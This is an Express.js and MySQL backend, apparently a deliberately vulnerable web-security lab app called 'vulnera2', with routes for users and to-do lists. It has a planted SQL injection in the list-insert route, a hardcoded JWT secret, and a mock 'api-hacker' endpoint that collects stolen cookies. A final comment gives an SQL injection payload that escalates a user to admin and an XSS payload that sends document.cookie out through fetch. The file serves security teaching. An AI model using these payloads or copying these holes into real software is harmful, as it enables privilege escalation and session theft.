const express = require('express')
const app = express()
app.use(express.json())
const port = 3000
const mysql = require('mysql');
const util = require('util');
var CryptoJS = require("crypto-js");
var jwt = require('jsonwebtoken');

const jwtSecret = 'vulnera2';
const connection = mysql.createConnection({
  host : 'localhost',
  user : 'root',
  // password : 'asdf1234',
  port: "3306",
  database: "seguridad-web",
  multipleStatements: true
});
const query = util.promisify(connection.query).bind(connection);

let cookie_parser=require('cookie-parser')

app.use(cookie_parser())

app.use(function (req, res, next) {

  // Website you wish to allow to connect
  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');

  // Request methods you wish to allow
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');

  // Request headers you wish to allow
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');

  // Set to true if you need the website to include cookies in the requests sent
  // to the API (e.g. in case you use sessions)
  res.setHeader('Access-Control-Allow-Credentials', true);

  // Pass to next layer of middleware
  next();
});

app.get('/users/:username', async (req, res) => {
  
  let validation = await validateRequest(req);

  if (!validation.success) {
    res.status(validation.statusCode).json({ response: validation.response });
    return;
  }

  let username = req.params.username; //validation.user;

  let response = {}
  connection.query({
    sql: 'SELECT * from `users` where `username` = ?',
    values: [username]
  }, function(err, rows, fields) {
    if (err) throw err;
    response = rows[0]
    if (!response) {
      res.status(404).json({ response: "No existe el usuario" });
      return;
    }
    
    res.json({response})
  });
})

//onlyAdmin
app.get('/lists', async (req, res) => {
  
  let validation = await validateRequest(req);

  if (!validation.success) {
    res.status(validation.statusCode).json({ response: validation.response });
    return;
  }
  
  let response = {}
  connection.query({
    sql: 'SELECT * FROM lists L;'
  }, function(err, rows, fields) {
    if (err) throw err;
    response = rows
    res.json({response: response})
  });
})

//onlyAdmin
app.get('/users', async (req, res) => {
  
  let validation = await validateRequest(req);

  if (!validation.success) {
    res.status(validation.statusCode).json({ response: validation.response });
    return;
  }

  let response = {}
  connection.query({
    sql: 'SELECT * FROM users;'
  }, function(err, rows, fields) {
    if (err) throw err;
    response = rows
    
    res.json({response: response})
  });
})

app.get('/users/:username/lists', async (req, res) => {
  
  let validation = await validateRequest(req);

  if (!validation.success) {
    res.status(validation.statusCode).json({ response: validation.response });
    return;
  }

  let username = req.params.username; //validation.user;
  
  let response = {}
  connection.query({
    sql: 'SELECT L.id, L.text FROM lists L JOIN users U ON L.user_id = U.id where U.username = ?',
    values: [username]
  }, function(err, rows, fields) {
    if (err) throw err;
    response = rows
    if (!response) {
      res.status(404).json({ response: "No existe el usuario" });
      return;
    }
    
    res.json({response: response})
  });
})

app.post('/users/:username/lists', async (req, res) => {

  let validation = await validateRequest(req);

  if (!validation.success) {
    res.status(validation.statusCode).json({ response: validation.response });
    return;
  }
  
  let username = req.params.username; //validation.user;

  let rows = await  query({
    sql: 'SELECT id from `users` where `username` = ?',
    values: [username]
  });
  let response = rows[0]
  if (!response) {
    res.status(404).json({ response: "No existe el usuario" });
    return;
  }
  try {
    await query("INSERT INTO lists (text, user_id) VALUES ('"+ req.body.text + "', "+response.id+");");
  } catch {}

  res.json({})
})

app.delete('/users/:username/lists/:id', async (req, res) => {
  
  let validation = await validateRequest(req);

  if (!validation.success) {
    res.status(validation.statusCode).json({ response: validation.response });
    return;
  }

  let username = req.params.username; //validation.user;

  let response = {}
  let notFound = "";
  connection.query({
    sql: 'SELECT id from `users` where `username` = ?',
    values: [username]
  }, function(err, rows, fields) {
    if (err) throw err;
    response = rows[0]
    if (!response) {
      notFound = "No existe el usuario";
    } else {
      connection.query({
        sql: 'DELETE FROM `lists` WHERE user_id = ? and id = ?',
        values: [response.id, req.params.id]
      }, function (error, results, fields) {
        if (error) throw error;
        if (results.affectedRows === 0) {
          notFound = "No existe ese elemento";
        }
      });
    }
    if (notFound) {
      res.status(404).json({ response: notFound });
      return;
    }
    res.json({})
  });
})

app.post('/login', (req, res) => {

  let isLoggedIn = req.cookies?.vulnera2Token

  let response = {}
  // if (isLoggedIn) {
  //   res.status(406).json({ response: "Ya hay un usuario logueado" });
  // } else {
    connection.query({
      sql: 'SELECT * from `users` where `username` = ? and `password` = ?',
      values: [req.body.username, req.body.password]
    }, function(err, rows, fields) {
      if (err) throw err;
      response = rows[0]

      if (!response) {
        res.status(404).json({ ok: false, response: "No existe usuario/contraseña" });
      } else {
        // res.cookie('username', req.body.username /*, {signed: true}*/)
        var token = jwt.sign({ username: req.body.username }, jwtSecret);
        res.cookie('vulnera2Token', token)
        res.json({ ok: true, response})
      }
    });
  // }
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)

  // var token = jwt.sign({ foo: 'bar' }, 'shhhhh');
  // console.log(token)
  // token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIyIiwiaWF0IjoxNjY2ODg2ODIwfQ.mRxBCwQRSNTciEBhU8LOsHA9inSgu92X6PLzTc58Pvk'
  // try {
  //   var decoded2 = jwt.decode(token);
  //   console.log('without', decoded2)
  //   var decoded = jwt.verify(token, 'shhhhh');
  //   console.log(decoded)
  //   var decoded = jwt.verify(token, 'wrong-secret');
  //   console.log(decoded)
  // } catch(err) {
  //   // err
  //   console.log('invalid')
  // }
})

const validateRequest = async (req) => {
  
  // let user = req.cookies?.username
  var token = req.cookies?.vulnera2Token
  // console.log(token)
  let user;
  try {
    var decoded = jwt.verify(token, jwtSecret);
    user = decoded.username
  } catch {
    return { success: false, statusCode: 401, response: "Token invalido" };
  }

  // console.log('validating user: ', user)

  if (!user) return { success: false, statusCode: 400, response: "No estas logueado" };
  
  if (user !== req.params.username) {
    let rows = await query({ sql: 'SELECT rol from `users` where `username` = ?', values: [user] });
    let response = rows[0]
    
    if (!response) return { success: false, statusCode: 404, response: "No existe el usuario" };

    if (response.rol !== "rol2") return { success: false, statusCode: 401, response: "No tenes acceso" }; 
  }

  return { success: true, user: user };
  //fin validacion
}

//SERVER EXTERNO
app.post('/api-hacker', (req, res) => {
  console.log('Soy un server externo. Credenciales: ', req.query.cookies)
})

/*
SQLI: ', 0); UPDATE users SET rol = 'rol2' WHERE username = 'manu' -- 
Codigo XSS:   <img src=\"foo\" onerror=\"(() => \nfetch(\'http://localhost:3000/api-hacker?cookies=\' + document.cookie, { method: \'POST\' }) )()\" />
*/